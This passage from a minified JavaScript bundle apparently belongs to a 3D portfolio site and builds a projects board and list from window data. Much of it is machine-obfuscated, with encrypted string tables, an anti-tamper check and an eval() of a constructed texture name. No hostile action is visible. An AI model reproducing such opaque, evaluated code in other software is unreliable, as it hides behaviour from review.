si(16,8)}},{key:"setMeshes",value:function(){this.meshes={},this.resources.items.areaOpenTexture.magFilter=1003,this.resources.items.areaOpenTexture.minFilter=1006,this.meshes.boardPlane=this.resources.items.projectsBoardPlane.scene.children[0],this.meshes.areaLabel=new Lt(new si(2,.5),new qe({transparent:!0,depthWrite:!1,color:16777215,alphaMap:this.resources.items.areaOpenTexture})),this.meshes.areaLabel.matrixAutoUpdate=!1}},{key:"setList",value:function(){var haydata_0x67dbf4=haydata_0x51fa,haydata_0x57ea8f=haydata_0x51fa,haydata_0x3155fb=haydata_0x51fa,haydata_0x4aed19=haydata_0x51fa,haydata_0x1cb78f=haydata_0x51fa,haydata_0x594b8d=haydata_0x1174,haydata_0x4e937c=haydata_0x1174,haydata_0x36ac13=haydata_0x1174,haydata_0x41745f=haydata_0x1174,haydata_0x1da77f=haydata_0x1174;function haydata_0x51fa(_0x3694bb,_0x302fc8){var _0x1cd7d6=haydata_0x4a4b();return haydata_0x51fa=function(_0x2a9e87,_0x4a7fba){_0x2a9e87=_0x2a9e87-(-0xd1*-0x22+-0x120b+0x85f*-0x1);var _0x182c13=_0x1cd7d6[_0x2a9e87];if(haydata_0x51fa['JzIToE']===undefined){var _0x1edb6d=function(_0x15ddd){var _0x4ea6d1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x4ee378='',_0xa2a91f='',_0x3fb7eb=_0x4ee378+_0x1edb6d;for(var _0x55d8ed=-0x35d+-0x67f*0x2+0x105b,_0x797db3,_0x4e902b,_0x569bcf=-0x18c5+0x11*0x20e+-0xa29;_0x4e902b=_0x15ddd['charAt'](_0x569bcf++);~_0x4e902b&&(_0x797db3=_0x55d8ed%(0x20af+0x17f4+0x41*-0xdf)?_0x797db3*(0xc07+0x22b*0xf+-0x2c4c)+_0x4e902b:_0x4e902b,_0x55d8ed++%(-0x1ec8+-0x1*0x2647+-0x4513*-0x1))?_0x4ee378+=_0x3fb7eb['charCodeAt'](_0x569bcf+(-0xe96+0x1631+0x1*-0x791))-(-0xd3b*-0x2+0xdb*-0x24+0x460)!==-0xab0+0x1a3f+-0xf8f?String['fromCharCode'](0x1*0x227b+0x7*-0x22a+-0x1256&_0x797db3>>(-(0x185+-0x1bd2+0x543*0x5)*_0x55d8ed&-0x1*-0x6d3+0x3e0*-0x4+0x8b3)):_0x55d8ed:-0x84+0x5ed*-0x4+0x1838){_0x4e902b=_0x4ea6d1['indexOf'](_0x4e902b)}for(var _0x5554f4=0x16a+0x2651+-0x27bb,_0x53eb31=_0x4ee378['length'];_0x5554f4<_0x53eb31;_0x5554f4++){_0xa2a91f+='%'+('00'+_0x4ee378['charCodeAt'](_0x5554f4)['toString'](0x38*-0x92+0x17dc+0x412*0x2))['slice'](-(0x1*-0xf7+0x1196+-0x109d*0x1))}return decodeURIComponent(_0xa2a91f)};var _0x508f69=function(_0x3478d9,_0x443f24){var _0x28ca15=[],_0x26c332=0x562+0x109*0x24+0x1553*-0x2,_0x44cc1e,_0x4c1957='';_0x3478d9=_0x1edb6d(_0x3478d9);var _0x273422;for(_0x273422=-0x21d2+-0x25ce+0x47a0;_0x273422<0x1*-0x33b+0x1*-0x37f+0x1*0x7ba;_0x273422++){_0x28ca15[_0x273422]=_0x273422}for(_0x273422=-0x5d*0x57+0x25*0x16+0x13*0x17f;_0x273422<0x2048+-0x4e7+-0x1a61;_0x273422++){_0x26c332=(_0x26c332+_0x28ca15[_0x273422]+_0x443f24['charCodeAt'](_0x273422%_0x443f24['length']))%(0x2*0x12aa+0x513*0x5+-0x51*0xc3),_0x44cc1e=_0x28ca15[_0x273422],_0x28ca15[_0x273422]=_0x28ca15[_0x26c332],_0x28ca15[_0x26c332]=_0x44cc1e}_0x273422=0x1fed+0x63*0x9+-0x2368,_0x26c332=0x157*0x15+-0x112b+-0xc*0xea;for(var _0x5b0e5d=0x174+0x2368+-0x126e*0x2;_0x5b0e5d<_0x3478d9['length'];_0x5b0e5d++){_0x273422=(_0x273422+(0x265a+0x3*-0x676+-0x12f7))%(-0x1b54+-0x73f+-0x1*-0x2393),_0x26c332=(_0x26c332+_0x28ca15[_0x273422])%(-0x219b+0x3*-0x11c+-0x2eb*-0xd),_0x44cc1e=_0x28ca15[_0x273422],_0x28ca15[_0x273422]=_0x28ca15[_0x26c332],_0x28ca15[_0x26c332]=_0x44cc1e,_0x4c1957+=String['fromCharCode'](_0x3478d9['charCodeAt'](_0x5b0e5d)^_0x28ca15[(_0x28ca15[_0x273422]+_0x28ca15[_0x26c332])%(-0x143*0x1a+0x2a9*-0xd+0x4463*0x1)])}return _0x4c1957};haydata_0x51fa['TvQeCc']=_0x508f69,_0x3694bb=arguments,haydata_0x51fa['JzIToE']=!![]}var _0x57f0dc=_0x1cd7d6[0xaf2+0x173a+0x2d9*-0xc],_0x91bf72=_0x2a9e87+_0x57f0dc,_0x5ebf68=_0x3694bb[_0x91bf72];if(!_0x5ebf68){if(haydata_0x51fa['LOZayd']===undefined){var _0x3777bf=function(_0x1f6a3a){this['UpjxsL']=_0x1f6a3a,this['XRhZFG']=[-0x1828+0x21e4+0x1*-0x9bb,-0x176+0x1*-0x1874+-0x3e*-0x6b,-0x1*0x1ab1+-0x1df8+0x38a9],this['Iykwnz']=function(){return'newState'},this['PshLeQ']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['EgWzlB']='[\x27|\x22].+[\x27|\x22];?\x20*}'};_0x3777bf['prototype']['vYBJKr']=function(){var _0x49a930=new RegExp(this['PshLeQ']+this['EgWzlB']),_0x462857=_0x49a930['test'](this['Iykwnz']['toString']())?--this['XRhZFG'][0x24fd+0x2*0x12b9+-0x4a6e]:--this['XRhZFG'][-0x1e9a+-0x210e+0x3fa8];return this['qnMvFJ'](_0x462857)},_0x3777bf['prototype']['qnMvFJ']=function(_0x3e4317){if(!Boolean(~_0x3e4317))return _0x3e4317;return this['oyxmFs'](this['UpjxsL'])},_0x3777bf['prototype']['oyxmFs']=function(_0x1c3d19){for(var _0x20b851=-0x3f6*-0x9+-0x4b2+-0x1ef4,_0x1e0c16=this['XRhZFG']['length'];_0x20b851<_0x1e0c16;_0x20b851++){this['XRhZFG']['push'](Math['round'](Math['random']())),_0x1e0c16=this['XRhZFG']['length']}return _0x1c3d19(this['XRhZFG'][-0x2*-0x569+-0xc6*-0x26+0x141b*-0x2])},new _0x3777bf(haydata_0x51fa)['vYBJKr'](),haydata_0x51fa['LOZayd']=!![]}_0x182c13=haydata_0x51fa['TvQeCc'](_0x182c13,_0x4a7fba),_0x3694bb[_0x91bf72]=_0x182c13}else _0x182c13=_0x5ebf68;return _0x182c13},haydata_0x51fa(_0x3694bb,_0x302fc8)}(function(_0x4dd5c8,_0x555878){var _0x1a153e=haydata_0x51fa,_0xddc17e=haydata_0x51fa,_0x51c03d=haydata_0x51fa,_0x58fa10=haydata_0x51fa,_0x409d72=haydata_0x51fa,_0x3a8c2d=haydata_0x1174,_0x5ebbae=haydata_0x1174,_0x50b385=haydata_0x1174,_0x7b08ee=_0x4dd5c8();while(!![]){try{var _0xd4387=-parseInt(_0x3a8c2d('0x183'))/(-0x1448+0xc8a+0x7bf*0x1)+-parseInt(_0x1a153e(0x1d0,'QYWa'))/(0x1*0x30a+-0x26c1*-0x1+0x233*-0x13)+-parseInt(_0xddc17e('0x195','6Q&('))/(0x1f2+0x2552+0xd*-0x305)+parseInt(_0x1a153e('0x19f','8KOZ'))/(0x2349*0x1+0x1*-0x116f+-0x11d6)*(parseInt(_0x58fa10('0x18b','[]Oi'))/(0x1db1+0x12*0x105+-0x3006))+parseInt(_0x3a8c2d('0x1ec'))/(0x12c0+0x4*0x40f+-0x22f6)*(-parseInt(_0x1a153e('0x174','h9Rs'))/(-0x24c2+-0x166c+0x3b35))+parseInt(_0x58fa10('0x1b7','0SjK'))/(-0x207e+0x1c*-0x52+-0x297e*-0x1)+-parseInt(_0x3a8c2d('0x1c9'))/(0x1801+0x66a+0xf31*-0x2)*(parseInt(_0x58fa10('0x166','5YDN'))/(0x25d4+0x1cb*0x11+-0x4445));if(_0xd4387===_0x555878)break;else _0x7b08ee['push'](_0x7b08ee['shift']())}catch(_0x10306d){_0x7b08ee['push'](_0x7b08ee['shift']())}}}(haydata_0x4a4b,0x1*0x471eb+-0x3*0x12df2+0x34ac4));function haydata_0x4a4b(){var _0xdf85de=['rCo6iG','sfjk','WR0IW4O','C2vH','CY5Y','q8oEEW','zmogWO8','WPNdMmk9','iL5WWO3cO8kPtCo6sWTHA8oJ','BhGV','W6z0WQu','W5/dMSo9','pMif','y3rP','kmoWka','W6z0WRa','WQuXW5W','mtu1mZC2v1LbzfDy','WRu+ha','WRy4rCo2xGLyWOKBEcxdJq','DgLU','WOWPja','WQKXW5e','W5rytG','CCkyoa','W6vVaG','mJeZnZqXyLDZrgXq','yxvu','u2ldMW','uSo0WQy','W7btvG','E3xdImkOWOtdQSoBWPK1WPtcPSkb','mte5yvfzuwjm','WObLfSoPW6ZcLmoJWR3cPCoQEmo5','t8ochW','r8owWP0','W4VdR28','WR5OyW','W4D8WQq','W57dImoM','Aw1H','CLG5','hmo7WOq','W6LVdW','taJcHW','Dwn0','DxjJ','zKv4','W4RdJY8','DhvY','WPhdKce','zMrZ','W5RdGJi','AxrL','fb/dJa','sh7cSG','gd/dLW','kcGO','CMnO','C3rY','tLm6','mZmZnZHYCxnczey','W7Tgrq','W4/dL8oG','WQ7cOq4','WPi+lG','W6TJWRK','zxmU','W4hdJSoT','sCo6lW','icxcMq','AMvJ','vSobwa','W6LBkW','WRVdKSoL','gJVdJq','amkkqa','tmkcja','DgXP','ksSK','zKPt','zmo+fq','W7vcuG','etOO','W55mqW','uLjV','W4WIcW','W4KWvG','vNDJ','W61flq','WO09WRq','DhjP','WQmKbG','WRbSDa','W4JcMMi','vgv4','aSo3CG','y2f0','W6nqWQS','yGmP','mZbrC3zysMu','ASoOWRW','mmoWiG','E8oIcq','W5aloa','C8ovWPi','WOVdSCkS','fmkzwW','AhjL','ueXz','W4hdH8oQ','WQC5bW','gmkxnG','z3rO','WPpcTsG','tbhcNa','y29U','W5xcL3K','W5iOoW','qufV','qCk5nq','jCkWWQ9Hemovw8oc','ChjV','W5uLzW','zgf0','pINcLa','kSoNlG','zxzL','r0tcGq','ymkgcG','gaOd','WRWKwq','Ce9J','DgvU','hSkvoG','gZRdVZdcHZaFWOrf','B8ksca','zNvU','csK+','AgfS','WRPBWQi','yNv0','lCkeWR5CW7pdOLxcNG','WPa5WRG','htOL','ALLp','W5NdH8oQ','W6rWWR8','ndi3mZaZmNz0r3nsvq','W4zHWPq','ndiYmZeYC0ndvufv','A8kpna','WRnrWQ8','WPxdUmkM','BgLZ','W5pdMSoW','t8kMpG','AmoAWRK','D8k0FNyDW7tdPCkEW5BcNmkmW4y','WRe3jq','lSoRWPi','DgHP','WO7dIZGrfmoyWRRcH8kaW6xdQ8o+','xW4v','lISP','FH4I','Dg9U','ec80','l8okESkCWOhcQbBdICkGASopW5G','W5WJdq','WQJcJHq','B8ocWQi','W4u/tq','uaxcLW','EmkjmG','W5b7WRm','swVdOG','WPiKlG','e8orj3JdTSk7lZ4','W5tdSg/dI8oIkwFcUePcWRi','gJq/','jmoJoq','wNNcQq','Agf5','omoSWPm','uSkrjG','W4hdGSkY','FG0+','W75NWRm','zgLZ','dtq/','W5yicW','BxmU','oJlcLq'];haydata_0x4a4b=function(){return _0xdf85de};return haydata_0x4a4b()}var haydata_0x19edb1=function(){var _0x47522b=haydata_0x1174,_0x2ed0cf=haydata_0x1174,_0x489f22=haydata_0x1174,_0xaef3b3=haydata_0x1174,_0xc9b663=haydata_0x1174,_0x58ac61=haydata_0x51fa,_0x3a87b3=haydata_0x51fa,_0x306f6b=haydata_0x51fa,_0x49ad46=haydata_0x51fa,_0x55641b=haydata_0x51fa,_0x4f380c={'jYODA':_0x58ac61('0x1d3','gR##')+_0x47522b(0x191)+_0x3a87b3('0x1e1','vpk[')+_0x2ed0cf(0x1fe),'OnbVe':function(_0x1e5139,_0x1132c6){return _0x1e5139+_0x1132c6},'aQRfI':_0x306f6b(0x203,'i%6w')+_0x2ed0cf(0x167)+_0x2ed0cf('0x1f6')+'t_','QVcTC':_0x2ed0cf(0x18e)+_0x47522b(0x1b3)+_0x306f6b(0x1d6,'#[sG')+_0x3a87b3('0x1d5','QX7[')+_0x2ed0cf('0x1f2')+_0x49ad46(0x194,'xpXF')+_0x58ac61(0x196,'QYWa')+_0x47522b(0x1a4)+_0xaef3b3('0x167')+_0x489f22('0x1f6')+'t_','vLPvX':_0x58ac61(0x1d9,'8xAK')+_0x3a87b3('0x160','XXF9')+'e','OMHpr':function(_0x2a67f6,_0x4e2c8a){return _0x2a67f6(_0x4e2c8a)},'IbRFy':function(_0x52a780,_0xed2141){return _0x52a780===_0xed2141},'PLYet':_0x2ed0cf('0x207')+'yc','auTxX':_0x55641b('0x16e','8KOZ')+'Zl','NBvKy':function(_0xbdd186,_0x3d4f02){return _0xbdd186===_0x3d4f02},'pOcRS':_0x489f22(0x204)+'VC'},_0x6e556c=!![];return function(_0x1291a0,_0x5ca536){var _0x4180be=_0xaef3b3,_0x47e138=_0x55641b,_0xcd70f=_0x55641b,_0x274a1f=_0x58ac61;if(_0x4f380c[_0x47e138(0x1cc,'%C%9')+'Ky'](_0x4f380c[_0xcd70f(0x1ac,'X5#%')+'RS'],_0x4f380c[_0x4180be(0x171)+'RS'])){var _0x261807=_0x6e556c?function(){var _0x59015e=_0xcd70f,_0x590c21=_0x47e138,_0x3fd5ce=_0x47e138,_0x2aa2ab=_0x47e138,_0x5a0532=_0xcd70f,_0xce538f=_0x4180be,_0x1eb305=_0x4180be,_0x426142=_0x4180be,_0x3fc334=_0x4180be,_0x3146c4=_0x4180be,_0x23a3f4={'mOGph':_0x4f380c[_0xce538f('0x17e')+'DA'],'HRJYH':function(_0x289fea,_0x389dc6){var _0x2bfbb5=haydata_0x51fa;return _0x4f380c[_0x2bfbb5(0x1eb,'8Bm1')+'Ve'](_0x289fea,_0x389dc6)},'fJSjW':_0x4f380c[_0x59015e(0x16f,'xpXF')+'fI'],'AAoig':_0x4f380c[_0x59015e('0x1d2','5YDN')+'TC'],'nvYYd':_0x4f380c[_0x59015e('0x217','X5#%')+'vX'],'fdshl':function(_0x4bc3fa,_0x14147c){var _0x5ac1b2=_0x3fd5ce;return _0x4f380c[_0x5ac1b2(0x197,'nquP')+'pr'](_0x4bc3fa,_0x14147c)}};if(_0x4f380c[_0x590c21('0x190','0SjK')+'Fy'](_0x4f380c[_0xce538f(0x15a)+'et'],_0x4f380c[_0xce538f('0x15a')+'et'])){if(_0x5ca536){if(_0x4f380c[_0x5a0532('0x1ef','nquP')+'Fy'](_0x4f380c[_0x1eb305(0x1ca)+'xX'],_0x4f380c[_0x1eb305('0x1ca')+'xX'])){var _0x5103d5=_0x5ca536[_0x590c21(0x1cd,'XE@1')+'ly'](_0x1291a0,arguments);return _0x5ca536=null,_0x5103d5}else return _0x2d2731[_0x59015e(0x182,'QX7[')+_0x590c21(0x1f0,'1GSK')+'ng']()[_0x1eb305('0x1b2')+_0x2aa2ab('0x20d','vpk[')](_0x23a3f4[_0x5a0532(0x214,'[*s]')+'ph'])[_0x3fd5ce(0x1b4,'B26C')+_0x3fd5ce('0x218','[*s]')+'ng']()[_0x3146c4(0x161)+_0x426142('0x1ea')+_0x426142(0x1dc)+'or'](_0x318b96)[_0x5a0532(0x1d8,'8Bm1')+_0xce538f('0x1e9')](_0x23a3f4[_0x59015e(0x16d,'h9Rs')+'ph'])}}else{var _0x2bb5f6=_0x23a3f4[_0x1eb305('0x1b0')+'YH'](_0x23a3f4[_0x3fc334('0x1ff')+'jW'],_0x5558d5),_0x5aa99c=_0x23a3f4[_0x1eb305('0x1b0')+'YH'](_0x23a3f4[_0x1eb305('0x1b0')+'YH'](_0x23a3f4[_0xce538f('0x164')+'ig'],[_0x44fd87]),_0x23a3f4[_0x3fd5ce(0x168,'&DBk')+'Yd']),_0x3daad1={};_0x3daad1['x']=_0x66902e[_0x5a0532('0x1af','b92W')+_0x1eb305(0x169)+'a'][_0x1eb305(0x167)+_0x426142('0x1f6')+_0x2aa2ab('0x1f9','8rFl')+'st'][_0x18ba78][_0x3fd5ce(0x18c,'XagE')+_0x1eb305('0x193')][_0x59015e('0x1be','s%0!')+_0x3fc334(0x1de)+_0x3146c4('0x172')+'ts']['x'],_0x3daad1['y']=_0x7bc553[_0x3fd5ce(0x1a7,'aMoL')+_0x3fd5ce(0x201,'XE@1')+'a'][_0xce538f('0x167')+_0x3fc334(0x1f6)+_0x3146c4('0x1fd')+'st'][_0xf9265b][_0x590c21(0x19c,'QX7[')+_0xce538f('0x193')][_0x3146c4('0x178')+_0x2aa2ab(0x1e5,'08Ne')+_0x3fc334(0x172)+'ts']['y'];var _0x26aead={};_0x26aead[_0x2aa2ab(0x1f1,'s%0!')+'nt']=_0xec37d1[_0x5a0532('0x1da','#eC5')+_0x590c21('0x17d','xpXF')+'a'][_0x3fd5ce(0x1cb,'qt8$')+_0x2aa2ab('0x180','s%0!')+_0xce538f(0x1fd)+'st'][_0x48e982][_0x1eb305(0x17a)+_0x590c21('0x199','QYWa')][_0x1eb305('0x16c')+'nt'],_0x26aead[_0x1eb305('0x159')+'f']=_0x5bb796[_0x426142(0x1a4)+_0x3fd5ce('0x1e3','$N5O')+'a'][_0x3fc334('0x167')+_0x1eb305('0x1f6')+_0x5a0532('0x1f3','F(sZ')+'st'][_0x3641cc][_0x1eb305(0x17a)+_0x3146c4(0x193)][_0x2aa2ab('0x1bd','[]Oi')+'f'],_0x26aead[_0x1eb305('0x176')+_0x590c21(0x173,'!L[Q')+'on']=_0x5d2bba[_0xce538f(0x1a4)+_0xce538f('0x169')+'a'][_0x59015e(0x1a3,'h9Rs')+_0x426142('0x1f6')+_0x2aa2ab('0x1df','$N5O')+'st'][_0xbfefd7][_0x3fc334('0x17a')+_0x2aa2ab(0x20b,'Sc39')][_0x3fd5ce('0x18d','8xAK')+_0x1eb305('0x1bc')+'on'],_0x26aead['x']=_0x38a7b2[_0x3fd5ce(0x1fa,'08Ne')+_0x2aa2ab('0x1c5','WNy(')+'a'][_0x3fd5ce(0x216,'7D%o')+_0x2aa2ab('0x1c4','1GSK')+_0x426142('0x1fd')+'st'][_0x4d31ea][_0x426142('0x17a')+_0xce538f('0x193')]['x'],_0x26aead['y']=_0x56eb38[_0x590c21(0x170,'8xMG')+_0x1eb305('0x169')+'a'][_0x590c21('0x15f','gR##')+_0x1eb305(0x1f6)+_0x3146c4('0x1fd')+'st'][_0x5950cc][_0xce538f('0x17a')+_0x426142('0x193')]['y'],_0x26aead[_0x426142(0x178)+_0x5a0532('0x1b6','8YhK')+_0x3fc334(0x172)+'ts']=_0x3daad1,_0x14a504=_0x5c5166[_0x3fd5ce(0x1a1,'xpXF')+_0x2aa2ab('0x1b5','[*s]')]({'name':_0x549410[_0x3fc334(0x1a4)+_0xce538f('0x169')+'a'][_0x3fd5ce(0x1a9,'s%0!')+_0x590c21('0x186','8YhK')+_0x1eb305(0x1fd)+'st'][_0x2e82da][_0x3fd5ce(0x209,'vHc0')+'e'],'imageSources':_0x452773[_0x426142(0x1a4)+_0x590c21('0x1ba','#[sG')+'a'][_0x2aa2ab(0x177,'xpXF')+_0x2aa2ab('0x1ed','XE@1')+_0x5a0532(0x1db,'XXF9')+'st'][_0x4c5177][_0x426142(0x1d7)+'ge'],'floorTexture':_0x23a3f4[_0x1eb305('0x1e2')+'hl'](_0x307b3b,_0x5aa99c),'link':_0x26aead,'distinctions':_0x867548[_0x590c21('0x202','xpXF')+_0x590c21(0x1f4,'b92W')+'a'][_0x2aa2ab('0x15c','Sc39')+_0x3146c4('0x1f6')+_0x2aa2ab('0x219','8YhK')+'st'][_0x2bbe56][_0xce538f(0x1aa)+_0x59015e('0x16a','lIAh')+_0x1eb305('0x1bc')+_0x59015e('0x200','7D%o')]})}}:function(){};return _0x6e556c=![],_0x261807}else{var _0x3645ab=_0x59c60b[_0x47e138(0x1f7,'B26C')+'ly'](_0x1d327d,arguments);return _0x306cd5=null,_0x3645ab}}}(),haydata_0x14a38d=haydata_0x19edb1(this,function(){var _0x3100d7=haydata_0x1174,_0x524184=haydata_0x1174,_0x264ed1=haydata_0x1174,_0x2b48c7=haydata_0x1174,_0x3df1cb=haydata_0x1174,_0x458273=haydata_0x51fa,_0x3f1803=haydata_0x51fa,_0x328d56=haydata_0x51fa,_0x482b46=haydata_0x51fa,_0xa8c343=haydata_0x51fa,_0x2acaf6={};_0x2acaf6[_0x458273(0x189,'8KOZ')+'AV']=_0x3100d7(0x1e8)+_0x3100d7(0x191)+_0x3f1803('0x1d1','7bfE')+_0x458273(0x165,'ECDz');var _0x3df140=_0x2acaf6;return haydata_0x14a38d[_0x328d56(0x163,'X5#%')+_0x524184(0x20a)+'ng']()[_0x328d56('0x17c','vHc0')+_0x264ed1('0x1e9')](_0x3df140[_0x328d56(0x211,'s%0!')+'AV'])[_0x458273('0x175','iint')+_0x264ed1(0x20a)+'ng']()[_0xa8c343('0x185','qK]E')+_0xa8c343(0x198,'%C%9')+_0x3df1cb(0x1dc)+'or'](haydata_0x14a38d)[_0x3df1cb(0x1b2)+_0xa8c343(0x206,'&DBk')](_0x3df140[_0x3f1803(0x1b8,'8Bm1')+'AV'])});haydata_0x14a38d();var projectlist=[];function haydata_0x1174(_0x317643,_0x5ae701){var _0x2c41ea=haydata_0x4a4b();return haydata_0x1174=function(_0xc4ba7d,_0x49d087){_0xc4ba7d=_0xc4ba7d-(-0xd1*-0x22+-0x120b+0x85f*-0x1);var _0x662ce7=_0x2c41ea[_0xc4ba7d];if(haydata_0x1174['LloLsn']===undefined){var _0x5e7f3e=function(_0x3c61a2){var _0x1bea36='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0xe55678='',_0x26d89b='',_0x1a74b2=_0xe55678+_0x5e7f3e;for(var _0x69720c=-0x35d+-0x67f*0x2+0x105b,_0x43fa50,_0x25031c,_0x6ac3be=-0x18c5+0x11*0x20e+-0xa29;_0x25031c=_0x3c61a2['charAt'](_0x6ac3be++);~_0x25031c&&(_0x43fa50=_0x69720c%(0x20af+0x17f4+0x41*-0xdf)?_0x43fa50*(0xc07+0x22b*0xf+-0x2c4c)+_0x25031c:_0x25031c,_0x69720c++%(-0x1ec8+-0x1*0x2647+-0x4513*-0x1))?_0xe55678+=_0x1a74b2['charCodeAt'](_0x6ac3be+(-0xe96+0x1631+0x1*-0x791))-(-0xd3b*-0x2+0xdb*-0x24+0x460)!==-0xab0+0x1a3f+-0xf8f?String['fromCharCode'](0x1*0x227b+0x7*-0x22a+-0x1256&_0x43fa50>>(-(0x185+-0x1bd2+0x543*0x5)*_0x69720c&-0x1*-0x6d3+0x3e0*-0x4+0x8b3)):_0x69720c:-0x84+0x5ed*-0x4+0x1838){_0x25031c=_0x1bea36['indexOf'](_0x25031c)}for(var _0x2ba092=0x16a+0x2651+-0x27bb,_0xadd54a=_0xe55678['length'];_0x2ba092<_0xadd54a;_0x2ba092++){_0x26d89b+='%'+('00'+_0xe55678['charCodeAt'](_0x2ba092)['toString'](0x38*-0x92+0x17dc+0x412*0x2))['slice'](-(0x1*-0xf7+0x1196+-0x109d*0x1))}return decodeURIComponent(_0x26d89b)};haydata_0x1174['MlnEBG']=_0x5e7f3e,_0x317643=arguments,haydata_0x1174['LloLsn']=!![]}var _0x180875=_0x2c41ea[0x562+0x109*0x24+0x1553*-0x2],_0x1716d3=_0xc4ba7d+_0x180875,_0x4978c3=_0x317643[_0x1716d3];if(!_0x4978c3){var _0x46d72c=function(_0x3b41ca){this['tfazjl']=_0x3b41ca,this['CILcnc']=[-0x21d2+-0x25ce+0x47a1,0x1*-0x33b+0x1*-0x37f+0x1*0x6ba,-0x5d*0x57+0x25*0x16+0x13*0x17f],this['KhSGrf']=function(){return'newState'},this['vqpWqo']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['VvXurQ']='[\x27|\x22].+[\x27|\x22];?\x20*}'};_0x46d72c['prototype']['GJuwJx']=function(){var _0x50169e=new RegExp(this['vqpWqo']+this['VvXurQ']),_0xe65c12=_0x50169e['test'](this['KhSGrf']['toString']())?--this['CILcnc'][0x2048+-0x4e7+-0x1b60]:--this['CILcnc'][0x2*0x12aa+0x513*0x5+-0x7*0x8f5];return this['KkLncd'](_0xe65c12)},_0x46d72c['prototype']['KkLncd']=function(_0x7a6374){if(!Boolean(~_0x7a6374))return _0x7a6374;return this['Zjmskd'](this['tfazjl'])},_0x46d72c['prototype']['Zjmskd']=function(_0x57b1af){for(var _0x42668b=0x1fed+0x63*0x9+-0x2368,_0x114aee=this['CILcnc']['length'];_0x42668b<_0x114aee;_0x42668b++){this['CILcnc']['push'](Math['round'](Math['random']())),_0x114aee=this['CILcnc']['length']}return _0x57b1af(this['CILcnc'][0x157*0x15+-0x112b+-0xc*0xea])},new _0x46d72c(haydata_0x1174)['GJuwJx'](),_0x662ce7=haydata_0x1174['MlnEBG'](_0x662ce7),_0x317643[_0x1716d3]=_0x662ce7}else _0x662ce7=_0x4978c3;return _0x662ce7},haydata_0x1174(_0x317643,_0x5ae701)}for(var i=0x1dba*-0x1+-0xc98*0x2+0x12*0x30d;i<window[haydata_0x594b8d('0x1a4')+haydata_0x67dbf4(0x17d,'xpXF')+'a'][haydata_0x67dbf4(0x158,'7bfE')+haydata_0x4e937c('0x1f6')+haydata_0x4e937c('0x1fd')+'st'][haydata_0x67dbf4(0x17f,'F(sZ')+haydata_0x594b8d(0x15e)];i++){var projectname=haydata_0x67dbf4('0x1a8','0SjK')+haydata_0x67dbf4('0x1b1','WNy(')+haydata_0x36ac13(0x1f6)+'t_'+i,floorname=haydata_0x57ea8f(0x19e,'1GSK')+haydata_0x36ac13('0x1b3')+haydata_0x1cb78f(0x19d,'X1uU')+haydata_0x41745f(0x1dd)+haydata_0x41745f('0x1f2')+haydata_0x594b8d(0x1e4)+haydata_0x36ac13(0x1ad)+haydata_0x1cb78f('0x188','#[sG')+haydata_0x57ea8f('0x1a3','h9Rs')+haydata_0x4aed19(0x205,'X5#%')+'t_'+[i]+(haydata_0x4e937c(0x20e)+haydata_0x594b8d('0x1e0')+'e');projectlist=projectlist[haydata_0x41745f('0x161')+haydata_0x1da77f('0x210')]({'name':window[haydata_0x4aed19('0x1bb','1Tu8')+haydata_0x41745f(0x169)+'a'][haydata_0x1da77f(0x167)+haydata_0x57ea8f('0x1f5','lIAh')+haydata_0x57ea8f('0x1df','$N5O')+'st'][i][haydata_0x57ea8f('0x1fc','8KOZ')+'e'],'imageSources':window[haydata_0x1da77f(0x1a4)+haydata_0x3155fb(0x1a2,'[]Oi')+'a'][haydata_0x3155fb(0x215,'[]Oi')+haydata_0x4e937c(0x1f6)+haydata_0x4aed19('0x1df','$N5O')+'st'][i][haydata_0x1da77f('0x1d7')+'ge'],'floorTexture':eval(floorname),'link':{'event':window[haydata_0x4e937c(0x1a4)+haydata_0x4aed19('0x20c','*8lo')+'a'][haydata_0x1da77f('0x167')+haydata_0x67dbf4(0x1e7,'08Ne')+haydata_0x57ea8f('0x18a','%C%9')+'st'][i][haydata_0x1cb78f('0x1e6','h9Rs')+haydata_0x1da77f(0x193)][haydata_0x1cb78f(0x15d,'!L[Q')+'nt'],'href':window[haydata_0x594b8d('0x1a4')+haydata_0x41745f('0x169')+'a'][haydata_0x67dbf4('0x1a6','8KOZ')+haydata_0x1cb78f('0x16b','[]Oi')+haydata_0x4e937c(0x1fd)+'st'][i][haydata_0x594b8d(0x17a)+haydata_0x1da77f(0x193)][haydata_0x67dbf4(0x192,'0SjK')+'f'],'function':window[haydata_0x57ea8f('0x1bf','WNy(')+haydata_0x36ac13('0x169')+'a'][haydata_0x1cb78f(0x1a5,'8xAK')+haydata_0x57ea8f('0x20f','ECDz')+haydata_0x1cb78f('0x208','O2#j')+'st'][i][haydata_0x36ac13(0x17a)+haydata_0x4aed19('0x212','0SjK')][haydata_0x4e937c(0x176)+haydata_0x1cb78f(0x19b,'iint')+'on'],'x':window[haydata_0x3155fb(0x1b9,'s%0!')+haydata_0x57ea8f(0x1fb,'7bfE')+'a'][haydata_0x594b8d('0x167')+haydata_0x67dbf4('0x179','qK]E')+haydata_0x4e937c(0x1fd)+'st'][i][haydata_0x57ea8f(0x1c6,'i%6w')+haydata_0x41745f('0x193')]['x'],'y':window[haydata_0x36ac13(0x1a4)+haydata_0x57ea8f(0x1c8,'#eC5')+'a'][haydata_0x3155fb(0x1ae,'lIAh')+haydata_0x4aed19('0x1c7','iint')+haydata_0x1da77f(0x1fd)+'st'][i][haydata_0x4e937c('0x17a')+haydata_0x4e937c('0x193')]['y'],'halfExtents':{'x':window[haydata_0x4aed19('0x1fa','08Ne')+haydata_0x1da77f('0x169')+'a'][haydata_0x3155fb(0x184,'iint')+haydata_0x36ac13('0x1f6')+haydata_0x4e937c(0x1fd)+'st'][i][haydata_0x4e937c('0x17a')+haydata_0x57ea8f(0x1ab,'xpXF')][haydata_0x4e937c(0x178)+haydata_0x1da77f('0x1de')+haydata_0x67dbf4('0x15b','F(sZ')+'ts']['x'],'y':window[haydata_0x36ac13(0x1a4)+haydata_0x67dbf4('0x17d','xpXF')+'a'][haydata_0x3155fb('0x1f8','O2#j')+haydata_0x3155fb('0x1d4','*8lo')+haydata_0x4e937c('0x1fd')+'st'][i][haydata_0x3155fb(0x1c1,'Sc39')+haydata_0x41745f('0x193')][haydata_0x1da77f('0x178')+haydata_0x36ac13('0x1de')+haydata_0x1da77f('0x172')+'ts']['y']}},'distinctions':window[h